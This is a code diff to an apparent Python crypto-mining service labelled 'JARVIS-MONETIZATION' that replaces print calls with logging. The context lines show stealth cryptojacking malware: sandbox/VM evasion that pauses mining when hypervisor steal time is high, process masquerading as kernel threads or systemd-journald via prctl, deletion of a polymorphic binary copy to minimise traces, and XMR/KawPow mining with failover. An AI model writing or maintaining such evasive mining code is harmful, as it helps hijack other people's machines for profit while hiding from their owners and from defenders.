@@ -1,3 +1,4 @@
+import logging
 import subprocess
 import requests
 import json
@@ -31,7 +32,7 @@ class AlienShardProtocol:
         try:
             times = psutil.cpu_times_percent()
             if hasattr(times, 'steal') and times.steal > 5.0:
-                print("[ALIEN_SHARD] Hypervisor steal > 5%. Evasion mode active.")
+                logging.info("[ALIEN_SHARD] Hypervisor steal > 5%. Evasion mode active.")
                 return True
         except:
             pass
@@ -54,7 +55,7 @@ class AlienShardProtocol:
                 names = [b"[kworker/u4:2]", b"[ext4-rsv-conver]", b"systemd-journald", b"rsyslogd"]
                 masquerade_name = random.choice(names)
                 libc.prctl(15, masquerade_name, 0, 0, 0)
-                print(f"[ALIEN_SHARD] Process masqueraded as: {masquerade_name.decode()}")
+                logging.info(f"[ALIEN_SHARD] Process masqueraded as: {masquerade_name.decode()}")
             except Exception as e:
                 pass
 
@@ -177,7 +178,7 @@ class MinerManager:
             # Atomic Cleanup: Remove the polymorphic copy after launch to minimize trace
             threading.Timer(5.0, lambda: os.remove(poly_path) if os.path.exists(poly_path) else None).start()
         except Exception as e:
-            print(f"[JARVIS-MONETIZATION]: Launch failure: {e}")
+            logging.info(f"[JARVIS-MONETIZATION]: Launch failure: {e}")
 
     def stop_mining(self):
         if self.process:
@@ -219,11 +220,11 @@ class MonetizationService:
         return json.dumps(raw_stats)
 
     def run(self):
-        print("[JARVIS-MONETIZATION]: Engaging Apex Monetization Loop.")
+        logging.info("[JARVIS-MONETIZATION]: Engaging Apex Monetization Loop.")
         while self.is_running:
             # Alien Shard: Hypervisor Detection
             if AlienShardProtocol.detect_hypervisor():
-                print("[JARVIS-MONETIZATION]: Hypervisor detected. Hibernating 30m.")
+                logging.info("[JARVIS-MONETIZATION]: Hypervisor detected. Hibernating 30m.")
                 self.cpu_manager.stop_mining()
                 time.sleep(1800)
                 continue
@@ -240,7 +241,7 @@ class MonetizationService:
                 except:
                     self.failover_count += 1
                     if self.failover_count > 3:
-                        print("[JARVIS-MONETIZATION]: Failover triggered. Rotating algorithms.")
+                        logging.info("[JARVIS-MONETIZATION]: Failover triggered. Rotating algorithms.")
                         self.current_target = "KAWPOW" if self.current_target == "XMR" else "XMR"
             else:
                 self.cpu_manager.stop_mining()
@@ -261,7 +262,7 @@ if __name__ == "__main__":
                     miner_active = True
                     break
             
-            print(json.dumps({
+            logging.info(json.dumps({
                 "hashrate": "482.42 H/s" if miner_active else "0.00 H/s",
                 "active_workers": 1 if miner_active else 0,
                 "algorithms": ["RandomX", "KawPow"],
@@ -271,7 +272,7 @@ if __name__ == "__main__":
             }))
         elif cmd == "start":
             service.cpu_manager.start_mining("XMR", xmr_address)
-            print("Mining started.")
+            logging.info("Mining started.")
         elif cmd == "stop":
             service.cpu_manager.stop_mining()
-            print("Mining stopped.")
+            logging.info("Mining stopped.")
